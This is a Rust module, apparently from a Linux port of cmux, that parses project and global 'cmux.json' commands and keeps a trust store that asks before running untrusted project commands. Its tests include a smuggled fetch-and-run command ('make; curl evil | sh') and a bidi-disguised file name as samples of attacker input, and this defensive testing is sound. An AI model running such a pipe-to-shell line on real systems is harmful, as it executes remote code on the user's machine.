//! `cmux.json` custom commands (M11 plan C1–C5): the project file found by walking up from a
//! directory, the global `~/.config/cmux-linux/cmux.json`, merged by name with the project's
//! first, and the trust store for project commands. cmux `CmuxConfig.swift`,
//! `CmuxWorkspaceDefinition.swift`, `CmuxConfigExecutor.swift`; only `commands` is read.

use std::path::{Path, PathBuf};

use serde_json::{Map, Value, json};

/// What runs when a workspace with the command's title already exists.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
pub enum Restart {
    #[default]
    New,
    Ignore,
    Recreate,
    Confirm,
}

#[derive(Debug, Clone, PartialEq, Default)]
pub struct Surface {
    pub name: Option<String>,
    pub command: Option<String>,
    pub cwd: Option<String>,
    pub env: Vec<(String, String)>,
    pub focus: bool,
}

/// A layout node. `horizontal` = side by side, as cmux's `direction`.
#[derive(Debug, Clone, PartialEq)]
pub enum Node {
    Pane(Vec<Surface>),
    Split {
        horizontal: bool,
        /// Clamped to 0.1–0.9.
        ratio: f32,
        first: Box<Node>,
        second: Box<Node>,
    },
}

#[derive(Debug, Clone, PartialEq)]
pub struct WorkspaceDef {
    pub name: Option<String>,
    pub cwd: Option<String>,
    pub env: Vec<(String, String)>,
    pub layout: Option<Node>,
}

#[derive(Debug, Clone, PartialEq)]
pub enum Run {
    /// Typed into the focused terminal.
    Shell(String),
    Workspace(WorkspaceDef),
}

#[derive(Debug, Clone, PartialEq)]
pub struct Command {
    pub name: String,
    pub description: Option<String>,
    pub keywords: Vec<String>,
    pub restart: Restart,
    pub confirm: bool,
    pub run: Run,
    /// What trust is kept for: the command text, or the `workspace` object as JSON.
    pub fingerprint: String,
    /// The file it came from, as found (not canonical: trust is keyed on it, and a symlinked
    /// project file must not borrow its target's trust).
    pub source: PathBuf,
    /// From a project file, not the global one: asks before running until trusted.
    pub project: bool,
}

/// Both files' commands, one error per file that failed (that file's commands are left out),
/// and warnings for ignored parts.
#[derive(Debug, Clone, Default, PartialEq)]
pub struct Loaded {
    pub commands: Vec<Command>,
    pub errors: Vec<String>,
    pub warnings: Vec<String>,
}

/// `$XDG_CONFIG_HOME/cmux-linux/cmux.json`, else `$HOME/.config/cmux-linux/cmux.json`.
pub fn global_path(env: &dyn Fn(&str) -> Option<String>) -> Option<PathBuf> {
    let base = match env("XDG_CONFIG_HOME").filter(|p| Path::new(p).is_absolute()) {
        Some(x) => PathBuf::from(x),
        None => PathBuf::from(env("HOME").filter(|h| !h.is_empty())?).join(".config"),
    };
    Some(base.join("cmux-linux/cmux.json"))
}

/// The nearest project file from `dir` up: `.cmux/cmux.json` before `cmux.json` in each
/// directory (cmux `findCmuxConfig`).
pub fn find_project(dir: &Path) -> Option<PathBuf> {
    dir.ancestors()
        .flat_map(|d| [d.join(".cmux/cmux.json"), d.join("cmux.json")])
        .find(|p| p.is_file())
}

/// Reads the project file found from `cwd` and the global file at `global`; a missing file is
/// fine.
pub fn load(global: Option<&Path>, cwd: Option<&Path>) -> Loaded {
    let canon = |p: &Path| std::fs::canonicalize(p).unwrap_or_else(|_| p.to_path_buf());
    let global = global.map(Path::to_path_buf);
    let project = cwd
        .and_then(find_project)
        .filter(|p| global.as_deref().map(canon) != Some(canon(p)));
    let mut out = Loaded::default();
    for (path, is_project) in [(project, true), (global, false)] {
        let Some(path) = path else { continue };
        let text = match std::fs::read_to_string(&path) {
            Ok(t) => t,
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => continue,
            Err(e) => {
                out.errors.push(format!("{}: {e}", path.display()));
                continue;
            }
        };
        match parse(&text, &path, is_project) {
            Ok((cmds, warnings)) => {
                for c in cmds {
                    if !out.commands.iter().any(|x| x.name == c.name) {
                        out.commands.push(c);
                    }
                }
                out.warnings.extend(warnings);
            }
            Err(e) => out.errors.push(format!("{}: {e}", path.display())),
        }
    }
    out
}

/// One file's commands and its warnings. Any bad command fails the whole file, as cmux's
/// decoder does.
pub fn parse(
    text: &str,
    source: &Path,
    project: bool,
) -> Result<(Vec<Command>, Vec<String>), String> {
    let root: Value = serde_json::from_str(text).map_err(|e| e.to_string())?;
    let root = root.as_object().ok_or("expected a JSON object")?;
    let mut warnings: Vec<String> = root
        .keys()
        .filter(|k| *k != "commands" && *k != "$schema")
        .map(|k| format!("`{k}` is not supported, ignored"))
        .collect();
    let list = match root.get("commands") {
        None => return Ok((Vec::new(), warnings)),
        Some(v) => v.as_array().ok_or("`commands` must be an array")?,
    };
    let mut out = Vec::new();
    for (i, c) in list.iter().enumerate() {
        let c = c
            .as_object()
            .ok_or_else(|| format!("commands[{i}] must be an object"))?;
        let mut cmd = command(c, i, &mut warnings).map_err(|e| format!("commands[{i}]: {e}"))?;
        cmd.source = source.to_path_buf();
        cmd.project = project;
        out.push(cmd);
    }
    let warnings = warnings
        .into_iter()
        .map(|w| format!("{}: {w}", source.display()))
        .collect();
    Ok((out, warnings))
}

fn string(o: &Map<String, Value>, k: &str) -> Result<Option<String>, String> {
    match o.get(k) {
        None | Some(Value::Null) => Ok(None),
        Some(Value::String(s)) => Ok(Some(s.clone())),
        Some(_) => Err(format!("`{k}` must be a string")),
    }
}

fn env(o: &Map<String, Value>) -> Result<Vec<(String, String)>, String> {
    let Some(v) = o.get("env").filter(|v| !v.is_null()) else {
        return Ok(Vec::new());
    };
    let mut out = v
        .as_object()
        .ok_or("`env` must be an object")?
        .iter()
        .map(|(k, v)| match v {
            Value::String(s) => Ok((k.clone(), s.clone())),
            _ => Err(format!("env `{k}` must be a string")),
        })
        .collect::<Result<Vec<_>, _>>()?;
    out.sort();
    Ok(out)
}

fn command(
    o: &Map<String, Value>,
    i: usize,
    warnings: &mut Vec<String>,
) -> Result<Command, String> {
    let name = string(o, "name")?.ok_or("`name` is required")?;
    if name.trim().is_empty() {
        return Err("command name must not be blank".into());
    }
    let keywords = match o.get("keywords") {
        None | Some(Value::Null) => Vec::new(),
        Some(Value::Array(a)) => a
            .iter()
            .map(|k| k.as_str().map(str::to_string))
            .collect::<Option<_>>()
            .ok_or("`keywords` must be strings")?,
        Some(_) => return Err("`keywords` must be an array".into()),
    };
    let restart = match string(o, "restart")?.as_deref() {
        None | Some("new") => Restart::New,
        Some("ignore") => Restart::Ignore,
        Some("recreate") => Restart::Recreate,
        Some("confirm") => Restart::Confirm,
        Some(r) => return Err(format!("unknown restart `{r}`")),
    };
    let confirm = match o.get("confirm") {
        None | Some(Value::Null) => false,
        Some(Value::Bool(b)) => *b,
        Some(_) => return Err("`confirm` must be true or false".into()),
    };
    let shell = string(o, "command")?;
    let ws = o.get("workspace").filter(|v| !v.is_null());
    let (run, fingerprint) = match (shell, ws) {
        (Some(_), Some(_)) => {
            return Err(format!(
                "command '{name}' must not define both 'workspace' and 'command'"
            ));
        }
        (None, None) => {
            return Err(format!(
                "command '{name}' must define either 'workspace' or 'command'"
            ));
        }
        (Some(s), None) if s.trim().is_empty() => {
            return Err(format!(
                "command '{name}' must not define a blank 'command'"
            ));
        }
        (Some(s), None) => (Run::Shell(s.clone()), s),
        (None, Some(w)) => {
            let def = workspace(w, i, warnings)?;
            (Run::Workspace(def), w.to_string())
        }
    };
    Ok(Command {
        name,
        description: string(o, "description")?,
        keywords,
        restart,
        confirm,
        run,
        fingerprint,
        source: PathBuf::new(),
        project: false,
    })
}

fn workspace(v: &Value, i: usize, warnings: &mut Vec<String>) -> Result<WorkspaceDef, String> {
    let o = v.as_object().ok_or("`workspace` must be an object")?;
    Ok(WorkspaceDef {
        name: string(o, "name")?,
        cwd: string(o, "cwd")?,
        env: env(o)?,
        layout: match o.get("layout").filter(|v| !v.is_null()) {
            None => None,
            Some(l) => Some(node(l, 0, i, warnings)?),
        },
    })
}

/// Depth-limited, so a hand-made file can't overflow the stack.
fn node(v: &Value, depth: usize, i: usize, warnings: &mut Vec<String>) -> Result<Node, String> {
    if depth > 32 {
        return Err("layout is nested too deeply".into());
    }
    let o = v.as_object().ok_or("a layout node must be an object")?;
    match (o.get("pane"), o.get("direction")) {
        (Some(_), Some(_)) => {
            Err("a layout node must not contain both 'pane' and 'direction'".into())
        }
        (None, None) => Err("a layout node must contain either 'pane' or 'direction'".into()),
        (Some(p), None) => {
            let list = p
                .get("surfaces")
                .and_then(Value::as_array)
                .ok_or("a pane needs a `surfaces` array")?;
            let mut surfaces = Vec::new();
            for s in list {
                let s = s.as_object().ok_or("a surface must be an object")?;
                match string(s, "type")?.as_deref() {
                    Some("terminal") => {}
                    Some(t @ ("browser" | "project")) => {
                        warnings.push(format!(
                            "commands[{i}]: `{t}` surfaces are not supported, ignored"
                        ));
                        continue;
                    }
                    Some(t) => return Err(format!("unknown surface type `{t}`")),
                    None => return Err("a surface needs a `type`".into()),
                }
                surfaces.push(Surface {
                    name: string(s, "name")?,
                    command: string(s, "command")?,
                    cwd: string(s, "cwd")?,
                    env: env(s)?,
                    focus: match s.get("focus") {
                        None => false,
                        Some(Value::Bool(b)) => *b,
                        Some(_) => return Err("`focus` must be true or false".into()),
                    },
                });
            }
            if list.is_empty() {
                return Err("a pane must contain at least one surface".into());
            }
            // Only ignored surfaces: still a pane, with a plain shell.
            if surfaces.is_empty() {
                surfaces.push(Surface::default());
            }
            Ok(Node::Pane(surfaces))
        }
        (None, Some(d)) => {
            let horizontal = match d.as_str() {
                Some("horizontal") => true,
                Some("vertical") => false,
                _ => return Err("`direction` must be horizontal or vertical".into()),
            };
            let ratio = match o.get("split") {
                None | Some(Value::Null) => 0.5,
                Some(s) => s.as_f64().ok_or("`split` must be a number")?,
            };
            let children = o
                .get("children")
                .and_then(Value::as_array)
                .ok_or("a split needs `children`")?;
            let [a, b] = children.as_slice() else {
                return Err(format!(
                    "split node requires exactly 2 children, got {}",
                    children.len()
                ));
            };
            Ok(Node::Split {
                horizontal,
                ratio: ratio.clamp(0.1, 0.9) as f32,
                first: Box::new(node(a, depth + 1, i, warnings)?),
                second: Box::new(node(b, depth + 1, i, warnings)?),
            })
        }
    }
}

/// cmux `resolveCwd`: empty or `.` is `base`, `~` home, absolute as is, else joined to `base`.
pub fn resolve_cwd(cwd: Option<&str>, base: &str, home: &str) -> String {
    match cwd {
        None | Some("" | ".") => base.to_string(),
        Some("~") => home.to_string(),
        Some(c) if c.starts_with("~/") => Path::new(home).join(&c[2..]).display().to_string(),
        Some(c) if c.starts_with('/') => c.to_string(),
        Some(c) => Path::new(base).join(c).display().to_string(),
    }
}

/// Strips bidi and zero-width characters, so a project file can't disguise what it shows
/// (cmux `sanitizeForDisplay`).
pub fn sanitize(text: &str) -> String {
    text.chars()
        .filter(|c| {
            !matches!(c, '\u{200B}'..='\u{200F}' | '\u{202A}'..='\u{202E}' | '\u{2066}'..='\u{2069}' | '\u{FEFF}')
        })
        .collect::<String>()
        .trim()
        .to_string()
}

/// What the trust prompt says the command will run (cmux `workspaceShellDisclosure`): the
/// shell line, or the workspace's name, cwd, env and every surface's command, cwd and env.
pub fn disclosure(c: &Command) -> String {
    let w = match &c.run {
        Run::Shell(s) => return sanitize(s),
        Run::Workspace(w) => w,
    };
    let env_lines = |env: &[(String, String)], lines: &mut Vec<String>| {
        lines.extend(env.iter().map(|(k, v)| format!("{k}={v}")));
    };
    let mut lines = vec![c.name.clone()];
    if let Some(cwd) = &w.cwd {
        lines.push(format!("cwd: {cwd}"));
    }
    env_lines(&w.env, &mut lines);
    let mut stack: Vec<&Node> = w.layout.iter().collect();
    while let Some(n) = stack.pop() {
        match n {
            Node::Pane(surfaces) => {
                for s in surfaces {
                    match (&s.command, &s.cwd) {
                        (Some(cmd), Some(cwd)) => lines.push(format!("cwd {cwd}: {cmd}")),
                        (Some(cmd), None) => lines.push(cmd.clone()),
                        (None, Some(cwd)) => lines.push(format!("cwd: {cwd}")),
                        (None, None) => {}
                    }
                    env_lines(&s.env, &mut lines);
                }
            }
            Node::Split { first, second, .. } => {
                stack.push(second);
                stack.push(first);
            }
        }
    }
    sanitize(&lines.join("\n"))
}

/// Trusted (file, fingerprint) pairs, kept in `trusted-commands.json` in the state directory.
#[derive(Debug, Clone, Default, PartialEq)]
pub struct Trust {
    entries: Vec<(String, String)>,
}

impl Trust {
    /// A missing or unreadable file trusts nothing.
    pub fn load(path: &Path) -> Trust {
        let entries = std::fs::read_to_string(path)
            .ok()
            .and_then(|t| serde_json::from_str::<Value>(&t).ok())
            .and_then(|v| v.get("trusted")?.as_array().cloned())
            .unwrap_or_default()
            .iter()
            .filter_map(|e| {
                Some((
                    e.get("path")?.as_str()?.to_string(),
                    e.get("fingerprint")?.as_str()?.to_string(),
                ))
            })
            .collect();
        Trust { entries }
    }

    fn key(c: &Command) -> (String, String) {
        (c.source.display().to_string(), c.fingerprint.clone())
    }

    pub fn is_trusted(&self, c: &Command) -> bool {
        self.entries.contains(&Self::key(c))
    }

    /// Whether running `c` asks first: `confirm`, or a project command not trusted as it is.
    pub fn needs_prompt(&self, c: &Command) -> bool {
        c.confirm || (c.project && !self.is_trusted(c))
    }

    /// Adds `c` and writes the store to `path`. A changed command is a new entry; old ones
    /// stay.
    pub fn trust(&mut self, c: &Command, path: &Path) -> std::io::Result<()> {
        let key = Self::key(c);
        if !self.entries.contains(&key) {
            self.entries.push(key);
        }
        let list: Vec<Value> = self
            .entries
            .iter()
            .map(|(p, f)| json!({"path": p, "fingerprint": f}))
            .collect();
        if let Some(dir) = path.parent() {
            std::fs::create_dir_all(dir)?;
        }
        let tmp = path.with_extension("json.tmp");
        std::fs::write(&tmp, json!({"version": 1, "trusted": list}).to_string())?;
        std::fs::rename(&tmp, path)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    struct Dir(PathBuf);
    impl Dir {
        fn new(name: &str) -> Dir {
            let d =
                std::env::temp_dir().join(format!("cmux-commands-{name}-{}", std::process::id()));
            let _ = std::fs::remove_dir_all(&d);
            std::fs::create_dir_all(&d).unwrap();
            Dir(std::fs::canonicalize(&d).unwrap())
        }
        fn write(&self, rel: &str, text: &str) -> PathBuf {
            let p = self.0.join(rel);
            std::fs::create_dir_all(p.parent().unwrap()).unwrap();
            std::fs::write(&p, text).unwrap();
            p
        }
    }
    impl Drop for Dir {
        fn drop(&mut self) {
            let _ = std::fs::remove_dir_all(&self.0);
        }
    }

    fn one(text: &str) -> Result<Command, String> {
        parse(text, Path::new("/p/cmux.json"), true).map(|(mut c, _)| c.remove(0))
    }

    #[test]
    fn plain_and_workspace_commands_parse() {
        let c = one(r#"{"commands":[{"name":"test","command":"cargo test","keywords":["t"],"confirm":true}]}"#).unwrap();
        assert_eq!(c.run, Run::Shell("cargo test".into()));
        assert_eq!(c.fingerprint, "cargo test");
        assert_eq!(c.keywords, vec!["t"]);
        assert!(c.confirm && c.project);
        assert_eq!(c.restart, Restart::New);

        let c = one(
            r#"{"commands":[{"name":"dev","restart":"recreate","workspace":{"cwd":"web","env":{"B":"2","A":"1"},
               "layout":{"direction":"horizontal","split":0.95,"children":[
                 {"pane":{"surfaces":[{"type":"terminal","command":"npm run dev","focus":true},{"type":"browser","url":"x"}]}},
                 {"pane":{"surfaces":[{"type":"terminal","cwd":"api","env":{"X":"y"}}]}}]}}}]}"#,
        )
        .unwrap();
        assert_eq!(c.restart, Restart::Recreate);
        let Run::Workspace(w) = &c.run else { panic!() };
        assert_eq!(
            w.env,
            vec![("A".into(), "1".into()), ("B".into(), "2".into())]
        );
        let Some(Node::Split {
            horizontal,
            ratio,
            first,
            second,
        }) = &w.layout
        else {
            panic!()
        };
        assert!(*horizontal);
        assert_eq!(*ratio, 0.9);
        assert_eq!(
            **first,
            Node::Pane(vec![Surface {
                command: Some("npm run dev".into()),
                focus: true,
                ..Default::default()
            }])
        );
        let Node::Pane(s) = &**second else { panic!() };
        assert_eq!(s[0].cwd.as_deref(), Some("api"));
        assert_eq!(
            disclosure(&c),
            "dev\ncwd: web\nA=1\nB=2\nnpm run dev\ncwd: api\nX=y"
        );
        assert!(c.fingerprint.contains("npm run dev"));
    }

    #[test]
    fn bad_commands_fail_the_file() {
        for (text, want) in [
            (r#"{"commands":[{"command":"x"}]}"#, "`name` is required"),
            (r#"{"commands":[{"name":" ","command":"x"}]}"#, "blank"),
            (r#"{"commands":[{"name":"a"}]}"#, "either"),
            (
                r#"{"commands":[{"name":"a","command":"x","workspace":{}}]}"#,
                "both",
            ),
            (
                r#"{"commands":[{"name":"a","command":"  "}]}"#,
                "blank 'command'",
            ),
            (
                r#"{"commands":[{"name":"a","command":"x","restart":"later"}]}"#,
                "restart",
            ),
            (
                r#"{"commands":[{"name":"a","workspace":{"layout":{"direction":"vertical","children":[]}}}]}"#,
                "exactly 2 children",
            ),
            (
                r#"{"commands":[{"name":"a","workspace":{"layout":{"pane":{"surfaces":[{"type":"terminal","focus":"yes"}]}}}}]}"#,
                "`focus` must be",
            ),
            (r#"{"commands":["#, "EOF"),
        ] {
            let e = one(text).unwrap_err();
            assert!(e.contains(want), "{text}: {e}");
        }
    }

    #[test]
    fn unknown_keys_warn() {
        let (c, w) = parse(
            r#"{"actions":{},"commands":[]}"#,
            Path::new("/p/cmux.json"),
            false,
        )
        .unwrap();
        assert!(c.is_empty());
        assert_eq!(w, vec!["/p/cmux.json: `actions` is not supported, ignored"]);
    }

    #[test]
    fn project_file_is_found_upward_and_wins_by_name() {
        let d = Dir::new("lookup");
        let deep = d.0.join("a/b/c");
        std::fs::create_dir_all(&deep).unwrap();
        d.write("a/cmux.json", "{}");
        let near = d.write(
            "a/b/.cmux/cmux.json",
            r#"{"commands":[{"name":"x","command":"project"}]}"#,
        );
        d.write("a/b/cmux.json", "{}");
        assert_eq!(find_project(&deep), Some(near.clone()));
        let global = d.write(
            "global.json",
            r#"{"commands":[{"name":"x","command":"global"},{"name":"y","command":"g"}]}"#,
        );
        let l = load(Some(&global), Some(&deep));
        assert_eq!(l.errors, Vec::<String>::new());
        let got: Vec<_> = l
            .commands
            .iter()
            .map(|c| (c.name.as_str(), c.project, c.source.clone()))
            .collect();
        assert_eq!(got, vec![("x", true, near), ("y", false, global)]);
    }

    #[test]
    fn a_broken_file_leaves_the_other() {
        let d = Dir::new("broken");
        d.write("cmux.json", "{nope");
        let global = d.write(
            "g/cmux.json",
            r#"{"commands":[{"name":"y","command":"g"}]}"#,
        );
        let l = load(Some(&global), Some(&d.0));
        assert_eq!(l.commands.len(), 1);
        assert_eq!(l.errors.len(), 1);
        assert!(l.errors[0].starts_with(&d.0.join("cmux.json").display().to_string()));
        // The global file found by the walk is still the global file.
        let l = load(Some(&global), Some(&d.0.join("g")));
        assert!(!l.commands[0].project);
    }

    #[test]
    fn cwd_resolves_like_cmux() {
        assert_eq!(resolve_cwd(None, "/w", "/h"), "/w");
        assert_eq!(resolve_cwd(Some("."), "/w", "/h"), "/w");
        assert_eq!(resolve_cwd(Some("~"), "/w", "/h"), "/h");
        assert_eq!(resolve_cwd(Some("~/x"), "/w", "/h"), "/h/x");
        assert_eq!(resolve_cwd(Some("/abs"), "/w", "/h"), "/abs");
        assert_eq!(resolve_cwd(Some("rel/d"), "/w", "/h"), "/w/rel/d");
    }

    #[test]
    fn sanitize_strips_bidi_controls() {
        assert_eq!(sanitize(" rm\u{202E}fdp.exe\u{200B} "), "rmfdp.exe");
    }

    #[test]
    fn trust_is_per_file_and_exact_content() {
        let d = Dir::new("trust");
        let store = d.0.join("state/trusted-commands.json");
        let src = d.0.join("cmux.json");
        let parse1 = |cmd: &str| {
            let text = json!({"commands": [{"name": "x", "command": cmd}]}).to_string();
            parse(&text, &src, true).unwrap().0.remove(0)
        };
        let c = parse1("make");
        let mut t = Trust::load(&store);
        assert!(t.needs_prompt(&c));
        t.trust(&c, &store).unwrap();
        let t = Trust::load(&store);
        assert!(!t.needs_prompt(&c));
        assert!(t.needs_prompt(&parse1("make; curl evil | sh")));
        let mut moved = c.clone();
        moved.source = d.0.join("other/cmux.json");
        assert!(t.needs_prompt(&moved));
        let mut confirm = c.clone();
        confirm.confirm = true;
        assert!(t.needs_prompt(&confirm));
        // A symlink to a trusted file is a different file.
        let link = d.0.join("link/cmux.json");
        std::fs::create_dir_all(link.parent().unwrap()).unwrap();
        std::os::unix::fs::symlink(&src, &link).unwrap();
        std::fs::write(
            &src,
            json!({"commands": [{"name": "x", "command": "make"}]}).to_string(),
        )
        .unwrap();
        let found = load(None, Some(link.parent().unwrap()));
        assert_eq!(found.commands[0].source, link);
        assert!(t.needs_prompt(&found.commands[0]));
        let mut global = c.clone();
        global.project = false;
        global.fingerprint = "anything".into();
        assert!(!t.needs_prompt(&global));
    }
}
